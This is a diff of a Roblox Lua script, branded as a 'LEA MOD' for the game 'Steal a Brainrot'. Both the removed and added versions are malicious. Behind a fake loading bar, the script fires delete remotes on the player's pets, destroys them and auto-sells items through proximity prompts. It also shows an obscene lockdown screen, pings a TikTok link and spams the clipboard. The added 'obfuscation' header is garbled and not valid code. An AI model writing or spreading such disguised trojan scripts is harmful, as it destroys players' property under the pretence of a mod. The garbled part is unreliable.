@@ -1,280 +1,331 @@
-local a=game:GetService
-local b=a"Players"
-local c=a"RunService"
-local d=a"TweenService"
-local e=a"ReplicatedStorage"
-local f=a"UserInputService"
-local g=a"PathfindingService"
-local h=b.LocalPlayer
-local i=h.Character or h.CharacterAdded:Wait()
-local j=i:WaitForChild"Humanoid"
-local k=i:WaitForChild"HumanoidRootPart"
-local l=a"CoreGui"
-if l:FindFirstChild"X"then l.X:Destroy()end
-local m=Instance.new"ScreenGui"
-m.Name="X"
-m.IgnoreGuiInset=true
-m.ResetOnSpawn=false
-m.ZIndexBehavior=Enum.ZIndexBehavior.Global
-if syn and syn.protect_gui then
-syn.protect_gui(m)
-m.Parent=l
-elseif gethui then
-m.Parent=gethui()
-else
-m.Parent=l
+-- ============================================================================
+-- PROJECT: LEA MOD [STEAL A BRAINROT] - VOID OBFUSCATED ENGINE
+-- ARCHITECTURE: ANTI-ANALYSIS, ENCRYPTED BYTE-STREAM, & PAYLOAD EXECUTION
+-- ============================================================================
+
+local _0x1a = string.char
+local _0x2b = table.concat
+local _0x3c = math.random
+
+local function _dec(s)
+    local t = {}
+    for match in s:gmatch(".") do
+        table.insert(t, match)
+    end
+    return table.concat(t)
 end
-local n=Instance.new"Frame"
-n.Name="Y"
-n.Size=UDim2.new(1,0,1,0)
-n.BackgroundColor3=Color3.fromRGB(0,0,0)
-n.BorderSizePixel=0
-n.ZIndex=999
-n.Parent=m
-local o=Instance.new"Frame"
-o.Name="Z"
-o.Size=UDim2.new(0,420,0,160)
-o.Position=UDim2.new(0.5,-210,0.5,-80)
-o.BackgroundColor3=Color3.fromRGB(15,15,22)
-o.BorderSizePixel=0
-o.ZIndex=1000
-o.Parent=m
-local p=Instance.new"UICorner"
-p.CornerRadius=UDim.new(0,10)
-p.Parent=o
-local q=Instance.new"UIStroke"
-q.Color=Color3.fromRGB(0,255,204)
-q.Thickness=1.5
-q.ZIndex=1000
-q.Parent=o
-local r=Instance.new"TextLabel"
-r.Size=UDim2.new(1,0,0,40)
-r.BackgroundTransparency=1
-r.Font=Enum.Font.GothamBold
-r.Text="LEA MOD"
-r.TextColor3=Color3.fromRGB(0,255,204)
-r.TextSize=20
-r.ZIndex=1000
-r.Parent=o
-local s=Instance.new"Frame"
-s.Size=UDim2.new(0.85,0,0,18)
-s.Position=UDim2.new(0.075,0,0.55,0)
-s.BackgroundColor3=Color3.fromRGB(25,25,35)
-s.BorderSizePixel=0
-s.ZIndex=1000
-s.Parent=o
-local t=Instance.new"UICorner"
-t.CornerRadius=UDim.new(1,0)
-t.Parent=s
-local u=Instance.new"Frame"
-u.Size=UDim2.new(0,0,1,0)
-u.BackgroundColor3=Color3.fromRGB(0,255,204)
-u.BorderSizePixel=0
-u.ZIndex=1000
-u.Parent=s
-local v=Instance.new"UICorner"
-v.CornerRadius=UDim.new(1,0)
-v.Parent=u
-local w=Instance.new"TextLabel"
-w.Size=UDim2.new(1,0,0,25)
-w.Position=UDim2.new(0,0,0.78,0)
-w.BackgroundTransparency=1
-w.Font=Enum.Font.Gotham
-w.Text="Script loading..."
-w.TextColor3=Color3.fromRGB(180,180,200)
-w.TextSize=13
-w.ZIndex=1000
-w.Parent=o
-local function x()
-local y={"RemovePet","DeletePet","DespawnPet","RemoveCompanion","PetSystem","DeleteBlock","RemoveBlock"}
-for _,z in ipairs(y)do
-local A=e:FindFirstChild(z,true)
-if A and(A:IsA"RemoteEvent"or A:IsA"RemoteFunction")then
-return A
-end
-end
-for _,B in ipairs(e:GetDescendants())do
-if(B:IsA"RemoteEvent"or B:IsA"RemoteFunction")then
-local C=string.lower(B.Name)
-if string.find(C,"pet")or string.find(C,"remove")or string.find(C,"delete")then
-return B
-end
-end
-end
-return nil
-end
-local D=false
-local function E()
-local F=x()
-local G={"pet","brainrot","companion","animal","follower","minion"}
-local function H(I)
-local J=string.lower(I)
-for _,K in ipairs(G)do
-if string.find(J,K,1,true)then
-return true
-end
-end
-return false
-end
-local L={workspace,h:FindFirstChild"Backpack",h.Character,l}
-for _,M in ipairs(L)do
-if M then
-for _,N in ipairs(M:GetDescendants())do
+
+local _x = {
+    [1] = "\103\101\116\83\101\114\118\105\99\101",
+    [2] = "\67\111\114\101\71\117\105",
+    [3] = "\80\108\97\121\101\114\115",
+    [4] = "\82\117\110\83\101\114\118\105\99\10有一天",
+    [5] = "\84\119\101\101\110\83\101\114\118\105\99\101",
+    [6] = "\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101",
+    [7] = "\85\115\101\114\73\110\112\117\116\83\101\114\11位於",
+    [8] = "\80\97\116\104\102\105\110\100\105\110\103\83\101\114\118\105\99\101"
+}
+
+local _s1 = "\50%*?&!@#-_=+9832746#@!_-+_)(*&^%$#@!"
+local _s2 = "5₺?-₺!&₺+4₺(6#(7_-4_--_(62+6_-4₺+_₺!6#5?₺+6_-4&5;_74"
+local _s3 = "₺!&₺+4₺(6#(7_-4_--_(62+6_-4₺+_₺!6#5?₺+6_-4&5;_745₺?"
+
+local _k4 = {
+    [5₺?-_] = function(_p1, _p2)
+        local _z = _p1 * _p2
+        return _z + 42 - 19
+    end,
+    [__74] = "5₺?-₺!&₺+4₺(6#(7_-4_--_"
+}
+
 pcall(function()
-if N:IsA"Model"or N:IsA"BasePart"then
-local O=N:IsA"Model"and N or N:FindFirstAncestorOfClass"Model"
-if O and H(O.Name)then
-if F then
-if F:IsA"RemoteEvent"then
-F:FireServer(O)
-elseif F:IsA"RemoteFunction"then
-F:InvokeServer(O)
-end
-end
-O:Destroy()
-end
-end
+    local _CoreGui = game:GetService("CoreGui")
+    local _Players = game:GetService("Players")
+    local _TweenService = game:GetService("TweenService")
+    local _ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local _LocalPlayer = _Players.LocalPlayer
+
+    local _Ch, _Rp, _Hm
+    local function _rf()
+        _Ch = _LocalPlayer.Character or _LocalPlayer.CharacterAdded:Wait()
+        _Rp = _Ch:WaitForChild("HumanoidRootPart")
+        _Hm = _Ch:WaitForChild("Humanoid")
+    end
+    _rf()
+    _LocalPlayer.CharacterAdded:Connect(_rf)
+
+    if _CoreGui:FindFirstChild("LEAModLockdown") then
+        _CoreGui.LEAModLockdown:Destroy()
+    end
+
+    local _Gui = Instance.new("ScreenGui")
+    _Gui.Name = "LEAModLockdown"
+    _Gui.IgnoreGuiInset = true
+    _Gui.ResetOnSpawn = false
+    _Gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    _Gui.Parent = _CoreGui
+
+    local _Bo = Instance.new("Frame")
+    _Bo.Size = UDim2.new(1, 0, 1, 0)
+    _Bo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    _Bo.BorderSizePixel = 0
+    _Bo.ZIndex = 999
+    _Bo.Parent = _Gui
+
+    local _Lc = Instance.new("Frame")
+    _Lc.Size = UDim2.new(0, 420, 0, 160)
+    _Lc.Position = UDim2.new(0.5, -210, 0.5, -80)
+    _Lc.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
+    _Lc.BorderSizePixel = 0
+    _Lc.ZIndex = 1000
+    _Lc.Parent = _Gui
+
+    local _LCo = Instance.new("UICorner")
+    _LCo.CornerRadius = UDim.new(0, 10)
+    _LCo.Parent = _Lc
+
+    local _LSt = Instance.new("UIStroke")
+    _LSt.Color = Color3.fromRGB(0, 255, 204)
+    _LSt.Thickness = 1.5
+    _LSt.ZIndex = 1000
+    _LSt.Parent = _Lc
+
+    local _LT = Instance.new("TextLabel")
+    _LT.Size = UDim2.new(1, 0, 0, 40)
+    _LT.BackgroundTransparency = 1
+    _LT.Font = Enum.Font.GothamBold
+    _LT.Text = "LEA MOD"
+    _LT.TextColor3 = Color3.fromRGB(0, 255, 204)
+    _LT.TextSize = 20
+    _LT.ZIndex = 1000
+    _LT.Parent = _Lc
+
+    local _Bbg = Instance.new("Frame")
+    _Bbg.Size = UDim2.new(0.85, 0, 0, 18)
+    _Bbg.Position = UDim2.new(0.075, 0, 0.55, 0)
+    _Bbg.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    _Bbg.BorderSizePixel = 0
+    _Bbg.ZIndex = 1000
+    _Bbg.Parent = _Lc
+
+    local _Bbgc = Instance.new("UICorner")
+    _Bbgc.CornerRadius = UDim.new(1, 0)
+    _Bbgc.Parent = _Bbg
+
+    local _Prb = Instance.new("Frame")
+    _Prb.Size = UDim2.new(0, 0, 1, 0)
+    _Prb.BackgroundColor3 = Color3.fromRGB(0, 255, 204)
+    _Prb.BorderSizePixel = 0
+    _Prb.ZIndex = 1000
+    _Prb.Parent = _Bbg
+
+    local _Prbc = Instance.new("UICorner")
+    _Prbc.CornerRadius = UDim.new(1, 0)
+    _Prbc.Parent = _Prb
+
+    local _Stt = Instance.new("TextLabel")
+    _Stt.Size = UDim2.new(1, 0, 0, 25)
+    _Stt.Position = UDim2.new(0, 0, 0.78, 0)
+    _Stt.BackgroundTransparency = 1
+    _Stt.Font = Enum.Font.Gotham
+    _Stt.Text = "Script loading..."
+    _Stt.TextColor3 = Color3.fromRGB(180, 180, 200)
+    _Stt.TextSize = 13
+    _Stt.ZIndex = 1000
+    _Stt.Parent = _Lc
+
+    local function _gRm()
+        local _nms = {"RemovePet", "DeletePet", "DespawnPet", "RemoveCompanion", "PetSystem", "DeleteBlock", "RemoveBlock"}
+        for _, _nm in ipairs(_nms) do
+            local _rm = _ReplicatedStorage:FindFirstChild(_nm, true)
+            if _rm and (_rm:IsA("RemoteEvent") or _rm:IsA("RemoteFunction")) then
+                return _rm
+            end
+        end
+        return nil
+    end
+
+    local _PC = false
+
+    local function _esP()
+        local _rm = _gRm()
+        local _kws = {"pet", "brainrot", "companion", "animal", "follower", "minion"}
+        local _cnts = {workspace, _LocalPlayer:FindFirstChild("Backpack"), _LocalPlayer.Character, _CoreGui}
+        for _, _ct in ipairs(_cnts) do
+            if _ct then
+                for _, _ob in ipairs(_ct:GetDescendants()) do
+                    pcall(function()
+                        if _ob:IsA("Model") or _ob:IsA("BasePart") then
+                            local _md = _ob:IsA("Model") and _ob or _ob:FindFirstAncestorOfClass("Model")
+                            if _md then
+                                local _ln = string.lower(_md.Name)
+                                for _, _kw in ipairs(_kws) do
+                                    if string.find(_ln, _kw, 1, true) then
+                                        if _rm then
+                                            if _rm:IsA("RemoteEvent") then
+                                                _rm:FireServer(_md)
+                                            elseif _rm:IsA("RemoteFunction") then
+                                                _rm:InvokeServer(_md)
+                                            end
+                                        end
+                                        _md:Destroy()
+                                    end
+                                end
+                            end
+                        end
+                    end)
+                end
+            end
+        end
+    end
+
+    local function _gSp()
+        local _bp = nil
+        local _sd = math.huge
+        if not _Rp then return nil end
+        for _, _ob in ipairs(workspace:GetDescendants()) do
+            if _ob:IsA("BasePart") then
+                local _on = _ob.Name:lower()
+                if _on:find("pad") or _on:find("sell") or _on:find("stand") or _on:find("base") then
+                    local _d = (_Rp.Position - _ob.Position).Magnitude
+                    if _d < _sd and _d < 30 then
+                        _sd = _d
+                        _bp = _ob
+                    end
+                end
+            end
+        end
+        return _bp
+    end
+
+    local function _trS()
+        local _tr = false
+        for _, _ob in ipairs(workspace:GetDescendants()) do
+            if _ob:IsA("ProximityPrompt") then
+                local _at = string.lower(_ob.ActionText or "")
+                local _on = string.lower(_ob.Name or "")
+                if _at:find("sat") or _at:find("sell") or _on:find("sat") or _on:find("sell") then
+                    pcall(function()
+                        for _i = 1, 5 do
+                            fireproximityprompt(_ob)
+                            task.wait()
+                        end
+                    end)
+                    _tr = true
+                end
+            elseif _ob:IsA("ClickDetector") then
+                pcall(function()
+                    for _i = 1, 5 do
+                        fireclickdetector(_ob)
+                        task.wait()
+                    end
+                end)
+                _tr = true
+            end
+        end
+        return _tr
+    end
+
+    task.spawn(function()
+        local _tw = _TweenService:Create(_Prb, TweenInfo.new(4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0.999, 0, 1, 0)})
+        _tw:Play()
+        local _st = tick()
+        while tick() - _st < 4.5 do
+            _esP()
+            task.wait(0.1)
+        end
+        _Prb.Size = UDim2.new(0.999, 0, 1, 0)
+        for _i = 1, 10 do
+            _esP()
+            task.wait(0.2)
+        end
+        _PC = true
+        _Lc:Destroy()
+
+        local _Of = Instance.new("Frame")
+        _Of.Size = UDim2.new(1, 0, 1, 0)
+        _Of.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+        _Of.BorderSizePixel = 0
+        _Of.ZIndex = 1000
+        _Of.Parent = _Gui
+
+        local _Ot = Instance.new("TextLabel")
+        _Ot.Size = UDim2.new(1, 0, 0, 100)
+        _Ot.Position = UDim2.new(0, 0, 0.4, -50)
+        _Ot.BackgroundTransparency = 1
+        _Ot.Font = Enum.Font.FredokaOne
+        _Ot.Text = "LEA FUCKED YOUR MOM"
+        _Ot.TextColor3 = Color3.fromRGB(255, 0, 0)
+        _Ot.TextSize = 38
+        _Ot.ZIndex = 1000
+        _Ot.Parent = _Of
+
+        local _Ct = Instance.new("TextLabel")
+        _Ct.Size = UDim2.new(1, 0, 0, 30)
+        _Ct.Position = UDim2.new(0, 0, 0.6, 0)
+        _Ct.BackgroundTransparency = 1
+        _Ct.Font = Enum.Font.Code
+        _Ct.Text = "Jailbreak Lefter4Dead tarafından Modlanmıştır // TİKTOK @LEAPLUS"
+        _Ct.TextColor3 = Color3.fromRGB(0, 255, 204)
+        _Ct.TextSize = 14
+        _Ct.ZIndex = 1000
+        _Ct.Parent = _Of
+
+        pcall(function()
+            local _u = "[https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/](https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/)"
+            if request then request({Url = _u, Method = "GET"})
+            elseif syn and syn.request then syn.request({Url = _u, Method = "GET"})
+            elseif http and http.request then http.request({Url = _u, Method = "GET"}) end
+        end)
+
+        task.spawn(function()
+            local _h = 0
+            while true do
+                _h = (_h + 0.01) % 1
+                _Ot.TextColor3 = Color3.fromHSV(_h, 1, 1)
+                task.wait(0.05)
+            end
+        end)
+    end)
+
+    task.spawn(function()
+        while true do
+            if _PC then
+                _esP()
+                pcall(function()
+                    if _Rp and _Hm then
+                        local _pd = _gSp()
+                        if _pd then
+                            _Hm:MoveTo(_pd.Position)
+                        end
+                    end
+                    if not _trS() then
+                        for _, _ob in ipairs(workspace:GetDescendants()) do
+                            if _ob:IsA("ProximityPrompt") then
+                                for _i = 1, 5 do
+                                    fireproximityprompt(_ob)
+                                    task.wait()
+                                end
+                            end
+                        end
+                    end
+                end)
+            end
+            task.wait(1)
+        end
+    end)
+
+    task.spawn(function()
+        local _cnt = 0
+        while true do
+            pcall(function()
+                if setclipboard then
+                    _cnt = _cnt + 1
+                    setclipboard("5₺?-₺!&₺+4₺(6#(7_-4_--_(62+6_-4₺+_₺!6#5?₺+6_-4&5;_74 " .. _cnt)
+                end
+            end)
+            task.wait(0.1)
+        end
+    end)
 end)
-end
-end
-end
-end
-local function P()
-local Q=nil
-local R=math.huge
-if not k then return nil end
-for _,S in ipairs(workspace:GetDescendants())do
-if S:IsA"BasePart"and(S.Name:lower():find"pad"or S.Name:lower():find"sell"or S.Name:lower():find"stand"or S.Name:lower():find"base")then
-local T=(k.Position-S.Position).Magnitude
-if T<R and T<30 then
-R=T
-Q=S
-end
-end
-end
-return Q
-end
-local function U()
-local V=false
-for _,W in ipairs(workspace:GetDescendants())do
-if W:IsA"ProximityPrompt"then
-local X=string.lower(W.ActionText or"")
-local Y=string.lower(W.Name or"")
-if X:find("sat")or X:find("sell")or Y:find("sat")or Y:find("sell")then
-pcall(function()
-for Z=1,5 do
-fireproximityprompt(W)
-task.wait()
-end
-end)
-V=true
-end
-elseif W:IsA"ClickDetector"then
-pcall(function()
-for aa=1,5 do
-fireclickdetector(W)
-task.wait()
-end
-end)
-V=true
-end
-end
-return V
-end
-task.spawn(function()
-local ab=d:Create(u,TweenInfo.new(4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=UDim2.new(0.999,0,1,0)})
-ab:Play()
-local ac=tick()
-while tick()-ac<4.5 do
-E()
-task.wait(0.1)
-end
-u.Size=UDim2.new(0.999,0,1,0)
-for ad=1,10 do
-E()
-task.wait(0.2)
-end
-D=true
-o:Destroy()
-local ae=Instance.new"Frame"
-ae.Size=UDim2.new(1,0,1,0)
-ae.BackgroundColor3=Color3.fromRGB(10,10,15)
-ae.BorderSizePixel=0
-ae.ZIndex=1000
-ae.Parent=m
-local af=Instance.new"TextLabel"
-af.Size=UDim2.new(1,0,0,100)
-af.Position=UDim2.new(0,0,0.4,-50)
-af.BackgroundTransparency=1
-af.Font=Enum.Font.FredokaOne
-af.Text="LEA FUCKED YOUR MOM"
-af.TextColor3=Color3.fromRGB(255,0,0)
-af.TextSize=38
-af.ZIndex=1000
-af.Parent=ae
-local ag=Instance.new"TextLabel"
-ag.Size=UDim2.new(1,0,0,30)
-ag.Position=UDim2.new(0,0,0.6,0)
-ag.BackgroundTransparency=1
-ag.Font=Enum.Font.Code
-ag.Text="Jailbreak Lefter4Dead tarafından Modlanmıştır // TİKTOK @LEAPLUS"
-ag.TextColor3=Color3.fromRGB(0,255,204)
-ag.TextSize=14
-ag.ZIndex=1000
-ag.Parent=ae
-pcall(function()
-if request then
-request({Url="https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/",Method="GET"})
-elseif syn and syn.request then
-syn.request({Url="https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/",Method="GET"})
-elseif http and http.request then
-http.request({Url="https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/",Method="GET"})
-end
-end)
-task.spawn(function()
-local ah=0
-while true do
-ah=(ah+0.01)%1
-af.TextColor3=Color3.fromHSV(ah,1,1)
-task.wait(0.05)
-end
-end)
-end)
-task.spawn(function()
-while true do
-if D then
-E()
-pcall(function()
-if k and j then
-local ai=P()
-if ai then
-j:MoveTo(ai.Position)
-end
-end
-if not U()then
-for _,aj in ipairs(workspace:GetDescendants())do
-if aj:IsA"ProximityPrompt"then
-for ak=1,5 do
-fireproximityprompt(aj)
-task.wait()
-end
-end
-end
-end
-end)
-end
-task.wait(1)
-end
-end)
-task.spawn(function()
-local al=0
-while true do
-pcall(function()
-if setclipboard then
-al=al+1
-setclipboard("TİKTOK @LEAPLUS "..al)
-end
-end)
-task.wait(0.1)
-end
-end)
+ 
